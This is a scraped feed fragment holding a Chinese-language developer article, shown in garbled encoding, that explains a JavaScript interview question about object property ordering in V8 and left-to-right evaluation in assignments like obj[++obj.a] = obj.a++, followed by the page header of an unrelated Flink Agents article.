gyTsQd9wS+IQu4lciYdkI7CLrNH3Rvbb9FL41i0tbzVP2iWJkobpN5fmM4IJfJskTP1Bk8A9HQmbpmGDBrWqdVCN/Yd7PjxKGOXn+bmbto3feVVcVB9qehIL8EJy8nChwgr0O2xxBnhGU5eP2CfYbl/m4gBRsbtneMORP9oGpjpcCsiKzHHfdOPiQ/wMniyFEu2dbiTQCAeN/vavC466BGYLttXc9fmXBXMGlAhiHHur+sq6uPiUI9z7CVHMPwBnLSuuN8FuC48/Oaz1ylt94XfrW5ouyprwWfYRkwNyCyYYjwkBHows1fa+tV/fzGxlv39b9gqvfPmQ+i/HK8KlcBjhHwfl8HEHyOd1JnuzZd66S3TTPNNNP8/wDAfwDG7G0m9LKBpwAAAABJRU5ErkJggg==) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"ã€Œ"}.markdown-body strong:after{content:"ã€"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"â";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"â";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">æœ¬æ–‡å¤§çº²</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8b632613fda249f58d35395df0e16d89~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY5bCP5a-S:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768481095&amp;x-signature=igCEr5sAjtarjWf%2Fc60OP%2BOWCWo%3D" alt="" loading="lazy"/></p>
<p>ä»Šå¤©æ¥çœ‹ä¸€é“å‰ç«¯é¢è¯•çš„ä»£ç è¾“å‡ºé¢˜ã€‚</p>
<p>é¢è¯•å®˜æä¾›äº†ä¸€æ®µ <code>Javascript</code> ä»£ç ï¼Œè¦æ±‚ç»™å‡ºè¿™æ®µä»£ç è¿è¡Œåçš„è¾“å‡ºç»“æœã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> obj = {
  <span class="hljs-attr">a</span>: <span class="hljs-number">0</span>,
};

obj[<span class="hljs-string">'1'</span>] = <span class="hljs-number">0</span>;
obj[++obj.<span class="hljs-property">a</span>] = obj.<span class="hljs-property">a</span>++;
<span class="hljs-keyword">const</span> values = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">values</span>(obj);
obj[values[<span class="hljs-number">1</span>]] = obj.<span class="hljs-property">a</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj);

</code></pre>
<p>å…ˆåˆ†æè¿™é“é¢˜å‰ï¼Œå…ˆè¡¥å……ä¸¤ä¸ªä¸ªå‰ç½®çŸ¥è¯†ç‚¹ã€‚</p>
<h2 data-id="heading-1">çŸ¥è¯†ç‚¹ä¸€ï¼šå¯¹è±¡çš„å¸¸è§„å±æ€§ (properties) å’Œæ’åºå±æ€§ (elements)</h2>
<p>å…ˆæ¥çœ‹ä¸‹é¢ä¸€æ®µä»£ç ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> obj = {};
obj[<span class="hljs-string">'b'</span>] = <span class="hljs-string">'b'</span>
obj[<span class="hljs-number">100</span>] = <span class="hljs-string">'100'</span>;
obj[<span class="hljs-number">1</span>] = <span class="hljs-string">'1'</span>;
obj[<span class="hljs-string">'a'</span>] = <span class="hljs-string">'a'</span>;
obj[<span class="hljs-number">50</span>] = <span class="hljs-string">'50'</span>;
obj[<span class="hljs-string">'c'</span>] = <span class="hljs-string">'c'</span>;

<span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> obj){ 
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`key: <span class="hljs-subst">${key}</span> value: <span class="hljs-subst">${obj[key]}</span>`</span>)
}
<span class="hljs-comment">/**
 * æ‰“å°ç»“æœå¦‚ä¸‹ï¼š
  key: 1 value: 1
  key: 50 value: 50
  key: 100 value: 100
  key: b value: b
  key: a value: a
  key: c value: c
 */</span>
</code></pre>
<p>è§‚å¯Ÿä¸‹æ‰“å°çš„æ•°æ®ï¼Œå¾ˆæ˜æ˜¾å±æ€§çš„è®¾ç½®é¡ºåºå¹¶ä¸æ˜¯æ‰“å°çš„é¡ºåºï¼Œæ¯”å¦‚ <code>b</code> å±æ€§æ˜¯ç¬¬ä¸€ä¸ªè®¾ç½®çš„ï¼Œæ‰“å°ç»“æœå´æ’åœ¨ <code>100</code> åé¢ï¼Œä»”ç»†åˆ†æä»–ä»¬çš„æ‰“å°è§„å¾‹ï¼Œå¯ä»¥å¾—åˆ°å¦‚ä¸‹ç‰¹ç‚¹ï¼š</p>
<ol>
<li>æ•°å­—ç±»çš„å±æ€§ä¸ç®¡è®¾ç½®çš„é¡ºåºå…ˆåï¼Œéƒ½ä¼šè¢«ä¼˜å…ˆæ‰“å°ï¼Œè€Œä¸”æ˜¯æŒ‰ç…§ä»å°åˆ°å¤§çš„å‡åºè¿›è¡Œæ‰“å°çš„ã€‚</li>
<li>å­—ç¬¦ç±»å±æ€§ä¼šæŒ‰ç…§è®¾ç½®çš„é¡ºåºè¿›è¡Œæ‰“å°ï¼Œä¸Šé¢æˆ‘ä»¬æ˜¯æŒ‰ç…§ <code>b</code>ã€<code>a</code>ã€<code>c</code> çš„é¡ºåºè¿›è¡Œè®¾ç½®çš„ï¼Œæ‰“å°é¡ºåºä¹Ÿæ˜¯å¦‚æ­¤ã€‚</li>
</ol>
<p>ä¸ºä»€ä¹ˆä¼šå‡ºç°è¿™æ ·çš„ç»“æœå‘¢ï¼Ÿ</p>
<p>è¿™æ˜¯å› ä¸º ECMAScript è§„èŒƒä¸­å®šä¹‰äº†<strong>æ•°å­—å±æ€§åº”è¯¥æŒ‰ç…§ç´¢å¼•å€¼å¤§å°å‡åºæ’åˆ—ï¼Œå­—ç¬¦ä¸²å±æ€§æ ¹æ®åˆ›å»ºæ—¶çš„é¡ºåºå‡åºæ’åˆ—</strong>ã€‚åœ¨ <code>V8</code> ä¸­æ•°å­—å±æ€§è¢«ç§°ä¸º <code>elements</code>ï¼Œå­—ç¬¦ä¸²å±æ€§è¢«ç§°ä¸º <code>properties</code>ã€‚ä¹‹æ‰€ä»¥è¿™æ ·è®¾ç½®ï¼Œä¸»è¦æ˜¯ä¸ºäº†æå‡è®¿é—®æ€§èƒ½ã€‚<code>elements</code> å¯¹è±¡ä¸­ä¼šæŒ‰ç…§é¡ºåºå­˜æ”¾æ•°å­—å±æ€§ï¼Œç±»ä¼¼äºæ•°ç»„çš„å­˜å‚¨ï¼Œè¿™æ ·æŸ¥è¯¢çš„æ•ˆç‡å½“ç„¶å°±å¾ˆé«˜äº†ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d5555d23ce9e4f25b2ff5ecbb936bdb9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY5bCP5a-S:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768481095&amp;x-signature=%2BDV%2Btev3fVwCcpimN5bLZ7u0834%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-2">çŸ¥è¯†ç‚¹äºŒï¼šJavaScript è¿ç®—ç¬¦çš„æ‰§è¡Œé¡ºåº</h2>
<p><code>JavaScript</code> ä¸­æœ€å¸¸è§è¿ç®—ç¬¦å¦‚ä¸‹ï¼ˆ<strong>è¿ç®—é¡ºåºä»é«˜åˆ°ä½æ’åˆ—</strong>ï¼‰ï¼š</p>
<ul>
<li>å¯¹è±¡å±æ€§è®¿é—®ï¼Œæ¯”å¦‚ <code>obj.a</code>ï¼Œ<code>obj['a']</code>ã€‚</li>
<li>é€’å¢/é€’å‡ï¼Œæ¯”å¦‚ <code>a++</code>(åç½®é€’å¢) æˆ– <code>++a</code>ï¼ˆå‰ç½®é€’å¢ï¼‰ã€‚</li>
<li>ç®—æœ¯ï¼Œæ¯”å¦‚ <code>a + 1</code>ã€‚</li>
<li>æ¯”è¾ƒï¼ŒåŒ…æ‹¬ <code>&lt;</code>(å°äº)ã€<code>&gt;</code>(å¤§äº)ã€<code>&lt;=</code>(å°äºç­‰äº)ã€<code>&gt;=</code>(å¤§äºç­‰äº)ï¼Œæ¯”å¦‚ <code>a &gt; 3</code>ã€‚</li>
<li>ç›¸ç­‰ï¼ŒåŒ…æ‹¬ <code>==</code> ç²—ç•¥ç›¸ç­‰ï¼Œ <code>===</code>ä¸¥æ ¼ç›¸ç­‰ï¼Œ<code>!==</code> ç²—ç•¥ä¸ç­‰ï¼Œ<code>!==</code> ä¸¥æ ¼ä¸ç­‰ï¼Œæ¯”å¦‚ <code>a == 1</code>ã€‚</li>
<li>é€»è¾‘ï¼Œä¹Ÿå°±æ˜¯ä¸æˆ–éï¼Œ<code>&amp;</code>(ä¸)ã€<code>|</code>(æˆ–)ã€<code>!</code>(é)ï¼Œæ¯”å¦‚ <code>a &amp;&amp; b</code>ã€‚</li>
<li>ä¸‰å…ƒï¼Œæ¯”å¦‚ <code>flag ? '1' : '0'</code>ã€‚</li>
<li>èµ‹å€¼ï¼Œæ¯”å¦‚ <code>a = 1</code>ã€‚</li>
</ul>
<p>å¯¹äºå•ä¸ªèµ‹å€¼è¯­å¥ <code>LHS = RHS</code> çš„æ±‚å€¼ï¼Œæ ¹æ® <code>ECMAScript</code> è§„èŒƒï¼ˆ<code>ECMA-262, AssignmentExpression evaluation</code>ï¼‰ï¼Œå¯¹äº <code>LeftHandSideExpression = AssignmentExpression</code>ï¼Œå…¶è®¡ç®—é¡ºåºå¦‚ä¸‹ï¼š</p>
<ul>
<li>ç¬¬ä¸€æ­¥ï¼Œå…ˆå¾—åˆ°ä¸€ä¸ª <code>å¼•ç”¨ï¼ˆReferenceï¼‰</code>ï¼Œå³â€œè¦å†™å…¥çš„ä½ç½®â€ï¼Œä¹Ÿå°±æ˜¯ <code>Evaluate LeftHandSideExpression</code>ã€‚</li>
<li>ç¬¬äºŒæ­¥ï¼Œå†è®¡ç®—å³ä¾§çš„å€¼ï¼Œ<code>Evaluate AssignmentExpression</code>ã€‚</li>
<li>æœ€åå°†ç¬¬äºŒæ­¥å¾—åˆ°çš„å€¼å†™å…¥ç¬¬ä¸€æ­¥çš„å¼•ç”¨å½“ä¸­ã€‚</li>
</ul>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå¯¹äº<code>LHS = RHS</code> è¿™æ ·çš„èµ‹å€¼è¡¨è¾¾å¼ï¼Œå…¶è®¡ç®—é¡ºåºæ˜¯å·¦ä¾§å…ˆæ±‚å€¼ï¼ˆä¸ºäº†çŸ¥é“å†™åˆ°å“ªï¼‰ï¼Œå³ä¾§åæ±‚å€¼ï¼ˆä¸ºäº†çŸ¥é“å†™ä»€ä¹ˆï¼‰ï¼Œæœ€åå°†å³ä¾§çš„å€¼å†™å…¥å·¦ä¾§ã€‚</p>
<blockquote>
<p>ğŸ“Œ æ³¨æ„ï¼šè¿™é‡Œè¯´çš„â€œå·¦ä¾§æ±‚å€¼â€ä¸æ˜¯æ±‚å®ƒçš„å€¼ï¼Œè€Œæ˜¯æ±‚å®ƒçš„â€œä½ç½®â€ï¼ˆæ¯”å¦‚å±æ€§åã€å˜é‡åç­‰ï¼‰ã€‚ä¾‹å¦‚å¯¹äº <code>obj[++obj.a]</code>ï¼Œè¦ç¡®å®šå±æ€§åï¼Œå°±å¿…é¡»å…ˆæ‰§è¡Œ <code>++obj.a</code>ã€‚</p>
</blockquote>
<p>å†™ä¸ªç®€å•ä¾‹å­ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> obj = {
  <span class="hljs-keyword">get</span> <span class="hljs-title function_">a</span>() {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'è·å– a çš„å€¼'</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
  },
  <span class="hljs-keyword">get</span> <span class="hljs-title function_">b</span>() {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'è·å– b çš„å€¼'</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;
  }
}
obj[++obj.<span class="hljs-property">a</span>] = obj.<span class="hljs-property">b</span>++;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'obj: '</span>, obj);

</code></pre>
<p>æˆ‘ä»¬å‰é¢è¯´è¿‡ï¼Œè¿ç®—ç¬¦é¡ºåºæ˜¯<strong>å¯¹è±¡å±æ€§è®¿é—® &gt; é€’å¢/é€’å‡ &gt; èµ‹å€¼</strong>ï¼Œå¯¹äºèµ‹å€¼è¿ç®—ç¬¦ <code>LHS = RHS</code>ï¼Œä¼šå…ˆæ±‚å‡ºå·¦ä¾§ <code>LHS</code> çš„<code>å¼•ç”¨ï¼ˆReferenceï¼‰</code>ï¼Œå†è®¡ç®—å³ä¾§ <code>RHS</code> çš„å€¼ï¼Œæœ€åå°†å³ä¾§çš„å€¼èµ‹å€¼ç»™å·¦ä¾§çš„å¼•ç”¨ã€‚æ‰€ä»¥ç”¨è¿™ä¸ªé€»è¾‘æ¥åˆ†æä¸‹è¿™æ®µä»£ç çš„æ‰§è¡Œé¡ºåºï¼š</p>
<ul>
<li>ç¬¬ä¸€æ­¥ï¼Œå…ˆå– <code>obj.a</code> çš„å€¼ï¼Œ å–åˆ°çš„å€¼ä¸º <code>1</code>ï¼Œ ç„¶åæ‰§è¡Œå‰ç½®é€’å¢ <code>++obj.a</code>ï¼Œç»“æœä¸º <code>2</code>ï¼Œç„¶åç¨‹åºå°±çŸ¥é“è¦å¾€ <code>obj</code> çš„ <code>2</code> å±æ€§ä¸Šèµ‹å€¼äº†ã€‚</li>
<li>ç¬¬äºŒæ­¥ï¼Œç„¶åå†å– <code>obj.b</code> çš„å€¼ï¼Œæ‰§è¡Œåç½®é€’å¢ <code>obj.b++</code>ï¼Œå³ä¾§è®¡ç®—çš„å€¼ä¸º <code>2</code>ã€‚</li>
<li>æœ€åæŠŠå³ä¾§è®¡ç®—çš„ç»“æœå€¼ <code>2</code> èµ‹å€¼ç»™ <code>obj[2]</code> å±æ€§ã€‚</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d65d8e0804454dab897786f17dd1d7c5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY5bCP5a-S:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768481095&amp;x-signature=%2BLRc9h4VCVtobLCUpm3j6Jpp9Tk%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-3">é€è¡Œåˆ†æä»£ç æ‰§è¡Œè¿‡ç¨‹</h2>
<p>äº†è§£äº†è¿™ä¸¤ä¸ªçŸ¥è¯†ç‚¹åï¼Œè®©æˆ‘ä»¬æ¥é€è¡Œè§£æä¸‹è¿™æ®µä»£ç ã€‚</p>
<pre><code class="hljs language-js" lang="js">
<span class="hljs-keyword">const</span> obj = {
  <span class="hljs-attr">a</span>: <span class="hljs-number">0</span>,
};

obj[<span class="hljs-string">'1'</span>] = <span class="hljs-number">0</span>;
obj[++obj.<span class="hljs-property">a</span>] = obj.<span class="hljs-property">a</span>++;
<span class="hljs-keyword">const</span> values = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">values</span>(obj);
obj[values[<span class="hljs-number">1</span>]] = obj.<span class="hljs-property">a</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj);

</code></pre>
<ol>
<li>é¦–å…ˆï¼Œæˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªå¯¹è±¡ <code>obj</code>ï¼Œå®ƒæœ‰ä¸€ä¸ªå±æ€§ <code>a</code>ï¼Œå€¼ä¸º <code>0</code>ã€‚</li>
</ol>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> obj = {
  <span class="hljs-attr">a</span>: <span class="hljs-number">0</span>,
};
</code></pre>
<ol start="2">
<li>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ç»™ <code>obj</code> æ·»åŠ äº†ä¸€ä¸ªå±æ€§ <code>1</code>ï¼Œå€¼ä¸º <code>0</code>ï¼Œæ­¤æ—¶å¯¹è±¡ä¸­æœ‰ä¸¤ä¸ªå±æ€§ï¼Œ<code>a</code> å’Œ <code>1</code>ã€‚</li>
</ol>
<pre><code class="hljs language-js" lang="js">obj[<span class="hljs-string">'1'</span>] = <span class="hljs-number">0</span>;
</code></pre>
<p>ç”±äºæ•°å­—å±æ€§ä¼šæ’åœ¨å‰é¢ï¼Œæ­¤æ—¶ <code>obj</code> çš„å€¼ä¸ºï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"1"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<ol start="3">
<li>ç„¶åä¼šæ‰§è¡Œ <code>obj[++obj.a] = obj.a++</code>ï¼Œå‰é¢æˆ‘ä»¬åˆ†æè¿‡è¿ç®—ç¬¦çš„ä¼˜å…ˆçº§ï¼Œå…ˆæ‰§è¡Œå·¦ä¾§ <code>++obj.a</code> å¾—åˆ° <code>1</code>ï¼Œç„¶åæ‰§è¡Œå³ä¾§ <code>obj.a++</code>, ç”±äºæ˜¯åç½®é€’å¢ï¼Œæ‰€ä»¥å³ä¾§çš„å€¼ä¸º <code>1</code>ï¼Œæ‰§è¡Œèµ‹å€¼åï¼Œ<code>obj</code> çš„å€¼ä¸ºï¼š</li>
</ol>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"1"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<ol start="4">
<li>ç»è¿‡ <code>Object.values(obj)</code> åï¼Œ<code>values</code> çš„å€¼ä¸º <code>[1, 2]</code>ã€‚</li>
<li>æ‰§è¡Œ <code>obj[values[1]] = obj.a</code> ï¼Œè½¬æ¢åå°±æ˜¯ <code>obj[2] = 2</code>ã€‚<code>obj</code> çš„å€¼å˜ä¸ºï¼š</li>
</ol>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"1"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"2"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>è¿™å°±æ˜¯æœ€ç»ˆçš„è¾“å‡ºç»“æœäº†ã€‚</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/67db3f198c3548cbbe02e574f02adaf2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY5bCP5a-S:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768481095&amp;x-signature=hERycHLSiHFwiZNtvxWD1gG4z2k%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-4">å°ç»“</h2>
<p>è¯¥é¢˜ä¸»è¦è€ƒå¯Ÿä¸¤ä¸ªçŸ¥è¯†ç‚¹ï¼š</p>
<ol>
<li>åœ¨ <code>JavaScript</code> å¯¹è±¡ä¸­ï¼Œå±æ€§çš„è®¾ç½®é¡ºåºå¹¶ä¸ä¸€å®šæ˜¯å¾ªç¯æ‰“å°é¡ºåºï¼Œåœ¨ <code>V8</code>ä¸­ï¼Œæ•°å­—ç±»çš„å±æ€§åœ¨è¢«ç§°ä¸º <code>elements</code>ï¼ˆæŒ‰ä»å°åˆ°å¤§æ’åˆ—å­˜å‚¨ï¼‰ï¼Œå­—ç¬¦ç±»å±æ€§è¢«ç§°ä¸º <code>properties</code>ï¼ˆæŒ‰æ·»åŠ é¡ºåºå­˜å‚¨ï¼‰ã€‚</li>
<li><code>JavaScript</code> è¿ç®—ç¬¦çš„è¿ç®—é¡ºåºæ˜¯<strong>å¯¹è±¡å±æ€§è®¿é—® &gt; é€’å¢/é€’å‡ &gt; èµ‹å€¼</strong>ï¼Œå¯¹äºèµ‹å€¼è¿ç®—ç¬¦ <code>LHS = RHS</code>ï¼Œä¼šå…ˆæ±‚å‡ºå·¦ä¾§ <code>LHS</code> çš„<code>å¼•ç”¨ï¼ˆReferenceï¼‰</code>ï¼Œå†è®¡ç®—å³ä¾§ <code>RHS</code> çš„å€¼ï¼Œæœ€åå°†å³ä¾§çš„å€¼èµ‹å€¼ç»™å·¦ä¾§çš„å¼•ç”¨ã€‚</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€å¤§æ•°æ® & AIã€‘Flink Agents æºç è§£è¯» --- (5) --- ActionExecutionOperator]]></title>    <link>https://juejin.cn/post/7592818202717192211</link>    <guid>https://juejin.cn/post/7592818202717192211</guid>    <pubDate>2026-01-08T12:44:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592818202717192211" data-draft-id="7592452108797313067" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€å¤§æ•°æ® &amp; AIã€‘Flink Agents æºç è§£è¯» --- (5) --- ActionExecutionOperator"/> <meta itemprop="keywords" content="ç®—æ³•,äººå·¥æ™ºèƒ½,æ•°æ®åˆ†æ"/> <meta itemprop="datePublished" content="2026-01-08T12:44:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç½—è¥¿çš„æ€è€ƒ"/> <meta itemprop="url" content="https://juejin.cn/user/351470467691175"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€å¤§æ•°æ® &amp; AIã€‘Flink Agents æºç è§£è¯» --- (5) --- ActionExecutionOperator
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/351470467691175/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç½—è¥¿çš„æ€è€ƒ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T12:44:20.000Z" title="Thu Jan 08 2026 12:44:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»18åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 